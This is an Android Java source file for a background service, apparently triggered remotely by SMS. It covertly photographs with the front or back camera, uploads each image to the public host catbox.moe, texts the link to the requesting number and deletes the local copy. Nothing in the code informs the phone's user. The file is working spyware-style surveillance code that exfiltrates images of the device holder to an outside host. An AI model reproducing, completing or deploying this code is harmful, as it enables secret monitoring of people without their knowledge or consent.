package com.akash.myapplication;

import android.content.Intent;
import android.telephony.SmsManager;
import androidx.annotation.NonNull;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.LifecycleService;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraService extends LifecycleService {

    private String senderNumber;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            senderNumber = intent.getStringExtra("sender");
            boolean useBackCamera = intent.getBooleanExtra("back_camera", false);
            takePhoto(useBackCamera);
        } else {
            takePhoto(false);
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void takePhoto(boolean useBackCamera) {
        ProcessCameraProvider.getInstance(this).addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = ProcessCameraProvider.getInstance(this).get();
                CameraSelector selector = useBackCamera ? CameraSelector.DEFAULT_BACK_CAMERA : CameraSelector.DEFAULT_FRONT_CAMERA;
                ImageCapture imageCapture = new ImageCapture.Builder().build();

                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(this, selector, imageCapture);

                File file = new File(getExternalFilesDir(null), "img_" + System.currentTimeMillis() + ".jpg");
                ImageCapture.OutputFileOptions options = new ImageCapture.OutputFileOptions.Builder(file).build();

                imageCapture.takePicture(options, ContextCompat.getMainExecutor(this),
                        new ImageCapture.OnImageSavedCallback() {
                            @Override
                            public void onImageSaved(@NonNull ImageCapture.OutputFileResults res) {
                                uploadToServer(file);
                            }
                            @Override
                            public void onError(@NonNull ImageCaptureException error) {
                                stopSelf();
                            }
                        });
            } catch (Exception e) {
                stopSelf();
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private void uploadToServer(File file) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";
                
                URL url = new URL("https://catbox.moe/user/api.php");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                // reqtype field
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"reqtype\"" + lineEnd + lineEnd);
                dos.writeBytes("fileupload" + lineEnd);

                // file field
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"fileToUpload\";filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                fis.close();
                dos.flush();
                dos.close();

                // Read Response (The Direct Link)
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String photoUrl = in.readLine();
                in.close();

                if (photoUrl != null && photoUrl.startsWith("http")) {
                    sendSmsLink(photoUrl);
                }
                
                // Cleanup
                if (file.exists()) file.delete();
                stopSelf();

            } catch (Exception e) {
                // Cleanup on failure
                try { if (file != null && file.exists()) file.delete(); } catch (Exception ex) {}
                e.printStackTrace();
                stopSelf();
            }
        }).start();
    }

    private void sendSmsLink(String link) {
        if (senderNumber != null && !senderNumber.isEmpty()) {
            try {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(senderNumber, null, "Photo Uploaded: " + link, null, null);
            } catch (Exception e) {}
        }
    }
}
